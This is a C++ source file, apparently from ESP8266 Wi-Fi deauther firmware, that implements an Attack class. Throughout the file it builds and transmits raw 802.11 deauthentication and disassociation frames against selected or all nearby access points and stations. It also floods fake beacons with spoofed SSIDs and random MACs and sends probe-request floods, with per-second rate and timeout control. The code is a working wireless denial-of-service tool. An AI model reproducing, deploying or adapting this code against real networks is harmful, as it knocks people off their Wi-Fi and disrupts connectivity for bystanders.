#include "Attack.h"

Attack::Attack() {
  getRandomMac(mac);

  if (settings.getBeaconInterval()) {
    // 1s beacon interval
    beaconPacket[32] = 0xe8;
    beaconPacket[33] = 0x03;
  } else {
    // 100ms beacon interval
    beaconPacket[32] = 0x64;
    beaconPacket[33] = 0x00;
  }

  deauth.time = currentTime;
  beacon.time = currentTime;
  probe.time = currentTime;
}

void Attack::start() {
  stop();
  prntln(A_START);
  attackTime = currentTime;
  attackStartTime = currentTime;
  //accesspoints.sortAfterChannel();
  running = true;
}

void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
  Attack::beacon.active = beacon;
  Attack::deauth.active = deauth || deauthAll;
  Attack::deauthAll = deauthAll;
  Attack::probe.active = probe;

  Attack::output = output;
  Attack::timeout = timeout;

  //if (((beacon || probe) && ssids.count() > 0) || (deauthAll && scan.countAll() > 0) || (deauth && scan.countSelected() > 0)){
  if (beacon || probe || deauthAll || deauth) {
    start();
  } else {
    prntln(A_NO_MODE_ERROR);
    stop();
  }
}

void Attack::stop() {
  if (running) {
    running = false;
    deauthPkts = 0;
    beaconPkts = 0;
    probePkts = 0;
    deauth.packetCounter = 0;
    beacon.packetCounter = 0;
    probe.packetCounter = 0;
    deauth.maxPkts = 0;
    beacon.maxPkts = 0;
    probe.maxPkts = 0;
    deauth.tc = 0;
    beacon.tc = 0;
    probe.tc = 0;
    prntln(A_STOP);
  }
}

bool Attack::isRunning() {
  return running;
}

void Attack::updateCounter() {
  // stop when timeout is active and time is up
  if (timeout > 0 && currentTime - attackStartTime >= timeout) {
    prntln(A_TIMEOUT);
    stop();
    return;
  }

  // deauth packets per second
  if (deauth.active) {
    if (deauthAll) deauth.maxPkts = settings.getDeauthsPerTarget() * (scan.countAll() - names.selected());
    else deauth.maxPkts = settings.getDeauthsPerTarget() * scan.countSelected();
  } else {
    deauth.maxPkts = 0;
  }

  // beacon packets per second
  if (beacon.active) {
    beacon.maxPkts = ssids.count();
    if (!settings.getBeaconInterval()) beacon.maxPkts *= 10;
  } else {
    beacon.maxPkts = 0;
  }

  // probe packets per second
  if (probe.active) probe.maxPkts = ssids.count() * settings.getProbesPerSSID();
  else probe.maxPkts = 0;

  // random transmission power
  if (settings.getRandomTX() && (beacon.active || probe.active)) setOutputPower(random(21));
  else setOutputPower(20.5f);

  // reset counters
  deauthPkts = deauth.packetCounter;
  beaconPkts = beacon.packetCounter;
  probePkts = probe.packetCounter;
  deauth.packetCounter = 0;
  beacon.packetCounter = 0;
  probe.packetCounter = 0;
  deauth.tc = 0;
  beacon.tc = 0;
  probe.tc = 0;
}

void Attack::status() {
  char s[80];
  sprintf(s, str(A_STATUS).c_str(), deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts, probe.maxPkts);
  prnt(String(s));
}

String Attack::getStatusJSON() {
  String json = String(OPEN_BRACKET); // [
  json += String(OPEN_BRACKET) + b2s(deauth.active) + String(COMMA) + String(scan.countSelected()) + String(COMMA) + String(deauthPkts) + String(COMMA) + String(deauth.maxPkts) + String(CLOSE_BRACKET) + String(COMMA); // [false,0,0,0],
  json += String(OPEN_BRACKET) + b2s(beacon.active) + String(COMMA) + String(ssids.count()) + String(COMMA) + String(beaconPkts) + String(COMMA) + String(beacon.maxPkts) + String(CLOSE_BRACKET) + String(COMMA); // [false,0,0,0],
  json += String(OPEN_BRACKET) + b2s(probe.active) + String(COMMA) + String(ssids.count()) + String(COMMA) + String(probePkts) + String(COMMA) + String(probe.maxPkts) + String(CLOSE_BRACKET); // [false,0,0,0]
  json += CLOSE_BRACKET; // ]

  return json;
}

void Attack::update() {
  if (!running || scan.isScanning()) return;

  // run/update all attacks
  deauthUpdate();
  deauthAllUpdate();
  beaconUpdate();
  probeUpdate();

  // each second
  if (currentTime - attackTime > 1000) {
    attackTime = currentTime; // update time
    updateCounter();
    if (output) status(); // status update
    getRandomMac(mac);  // generate new random mac
  }
}

void Attack::deauthUpdate() {
  if (!deauthAll && deauth.active && deauth.maxPkts > 0 && deauth.packetCounter < deauth.maxPkts) {
    if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
      // APs
      if (accesspoints.count() > 0 && deauth.tc < accesspoints.count()) {
        if (accesspoints.getSelected(deauth.tc)) {
          deauth.tc += deauthAP(deauth.tc);
        } else deauth.tc++;
      }

      // Stations
      else if (stations.count() > 0 && deauth.tc >= accesspoints.count() && deauth.tc < stations.count() + accesspoints.count()) {
        if (stations.getSelected(deauth.tc - accesspoints.count())) {
          deauth.tc += deauthStation(deauth.tc - accesspoints.count());
        } else deauth.tc++;
      }

      // Names
      else if (names.count() > 0 && deauth.tc >= accesspoints.count() + stations.count() && deauth.tc < names.count() + stations.count() + accesspoints.count()) {
        if (names.getSelected(deauth.tc - stations.count() - accesspoints.count())) {
          deauth.tc += deauthName(deauth.tc - stations.count() - accesspoints.count());
        } else deauth.tc++;
      }

      // reset counter
      if (deauth.tc >= names.count() + stations.count() + accesspoints.count())
        deauth.tc = 0;
    }
  }
}

void Attack::deauthAllUpdate() {
  if (deauthAll && deauth.active && deauth.maxPkts > 0 && deauth.packetCounter < deauth.maxPkts) {
    if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
      // APs
      if (accesspoints.count() > 0 && deauth.tc < accesspoints.count()) {
        tmpID = names.findID(accesspoints.getMac(deauth.tc));
        if (tmpID < 0) {
          deauth.tc += deauthAP(deauth.tc);
        } else if (!names.getSelected(tmpID)) {
          deauth.tc += deauthAP(deauth.tc);
        } else deauth.tc++;
      }

      // Stations
      else if (stations.count() > 0 && deauth.tc >= accesspoints.count() && deauth.tc < stations.count() + accesspoints.count()) {
        tmpID = names.findID(stations.getMac(deauth.tc - accesspoints.count()));
        if (tmpID < 0) {
          deauth.tc += deauthStation(deauth.tc - accesspoints.count());
        } else if (!names.getSelected(tmpID)) {
          deauth.tc += deauthStation(deauth.tc - accesspoints.count());
        } else deauth.tc++;
      }

      // Names
      else if (names.count() > 0 && deauth.tc >= accesspoints.count() + stations.count() && deauth.tc < accesspoints.count() + stations.count() + names.count()) {
        if (!names.getSelected(deauth.tc - accesspoints.count() - stations.count())) {
          deauth.tc += deauthName(deauth.tc - accesspoints.count() - stations.count());
        } else deauth.tc++;
      }

      // reset counter
      if (deauth.tc >= names.count() + stations.count() + accesspoints.count())
        deauth.tc = 0;
    }
  }
}

void Attack::probeUpdate() {
  if (probe.active && probe.maxPkts > 0 && probe.packetCounter < probe.maxPkts) {
    if (probe.time <= currentTime - (1000 / probe.maxPkts)) {
      if (settings.getBeaconChannel()) setWifiChannel(probe.tc % settings.getMaxCh());
      probe.tc += sendProbe(probe.tc);
      if (probe.tc >= ssids.count()) probe.tc = 0;
    }
  }
}

void Attack:: beaconUpdate() {
  if (beacon.active && beacon.maxPkts > 0 && beacon.packetCounter < beacon.maxPkts) {
    if (beacon.time <= currentTime - (1000 / beacon.maxPkts)) {
      beacon.tc += sendBeacon(beacon.tc);
      if (beacon.tc >= ssids.count()) beacon.tc = 0;
    }
  }
}

bool Attack::deauthStation(uint8_t num) {
  return deauthDevice(accesspoints.getMac(stations.getAP(num)), stations.getMac(num), settings.getDeauthReason(), accesspoints.getCh(stations.getAP(num)));
}

bool Attack::deauthAP(uint8_t num) {
  return deauthDevice(accesspoints.getMac(num), broadcast, settings.getDeauthReason(), accesspoints.getCh(num));
}

bool Attack::deauthName(uint8_t num) {
  if (names.isStation(num)) {
    return deauthDevice(names.getBssid(num), names.getMac(num), settings.getDeauthReason(), names.getCh(num));
  } else {
    return deauthDevice(names.getMac(num), broadcast, settings.getDeauthReason(), names.getCh(num));
  }
}

bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
  if (!stMac) return false; // exit when station mac is null

  //Serial.println("Deauthing "+macToStr(apMac)+" -> "+macToStr(stMac)); // for debugging

  bool success = false;

  // build deauth packet
  packetSize = sizeof(deauthPacket);
  memcpy(&deauthPacket[4], stMac, 6);
  memcpy(&deauthPacket[10], apMac, 6);
  memcpy(&deauthPacket[16], apMac, 6);
  deauthPacket[24] = reason;

  // send deauth frame
  deauthPacket[0] = 0xc0;
  if (sendPacket(deauthPacket, packetSize, &deauth.packetCounter, ch, settings.getForcePackets()))
    success = true;

  // send disassociate frame
  deauthPacket[0] = 0xa0;
  if (sendPacket(deauthPacket, packetSize, &deauth.packetCounter, ch, settings.getForcePackets()))
    success = true;

  // send another packet, this time from the station to the accesspoint
  if (!macBroadcast(stMac)) { // but only if the packet isn't a broadcast
    if (deauthDevice(stMac, apMac, reason, ch)) {
      success = true;
    }
  }

  if (success) deauth.time = currentTime;

  return success;
}

bool Attack::sendBeacon(uint8_t tc) {
  if (settings.getBeaconChannel()) setWifiChannel(tc % settings.getMaxCh());
  mac[5] = tc;
  return sendBeacon(mac, ssids.getName(tc).c_str(), wifi_channel, ssids.getWPA2(tc));
}

bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
  packetSize = sizeof(beaconPacket);

  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  int ssidLen = strlen(ssid);
  if(ssidLen > 32) ssidLen = 32;
  
  memcpy(&beaconPacket[10], mac, 6);
  memcpy(&beaconPacket[16], mac, 6);
  memcpy(&beaconPacket[38], ssid, ssidLen);
  
  beaconPacket[82] = ch;

  if (sendPacket(beaconPacket, packetSize, &beacon.packetCounter, ch, settings.getForcePackets())) {
    beacon.time = currentTime;
    return true;
  }
  
  return false;
}

bool Attack::sendProbe(uint8_t tc) {
  if (settings.getBeaconChannel()) setWifiChannel(tc % settings.getMaxCh());
  mac[5] = tc;
  return sendProbe(mac, ssids.getName(tc).c_str(), wifi_channel);
}

bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
  packetSize = sizeof(probePacket);
  int ssidLen = strlen(ssid);
  if(ssidLen > 32) ssidLen = 32;
  
  memcpy(&probePacket[10], mac, 6);
  memcpy(&probePacket[26], ssid, ssidLen);

  if (sendPacket(probePacket, packetSize, &probe.packetCounter, ch, settings.getForcePackets())) {
    probe.time = currentTime;
    return true;
  }
  
  return false;
}

bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint16_t* packetCounter, uint8_t ch, uint16_t tries) {
  //Serial.println(bytesToStr(packet, packetSize));

  // set channel
  setWifiChannel(ch);

  // sent out packet
  bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;

  // try again until it's sent out
  for (int i = 0; i < tries && !sent; i++) {
    yield();
    sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
  }

  if (sent) (*packetCounter)++;
  return sent;
}

void Attack::enableOutput() {
  output = true;
  prntln(A_ENABLED_OUTPUT);
}

void Attack::disableOutput() {
  output = false;
  prntln(A_DISABLED_OUTPUT);
}

uint32_t Attack::getDeauthPkts() {
  return deauthPkts;
}

uint32_t Attack::getBeaconPkts() {
  return beaconPkts;
}

uint32_t Attack::getProbePkts() {
  return probePkts;
}

uint32_t Attack::getDeauthMaxPkts() {
  return deauth.maxPkts;
}

uint32_t Attack::getBeaconMaxPkts() {
  return beacon.maxPkts;
}

uint32_t Attack::getProbeMaxPkts() {
  return probe.maxPkts;
}

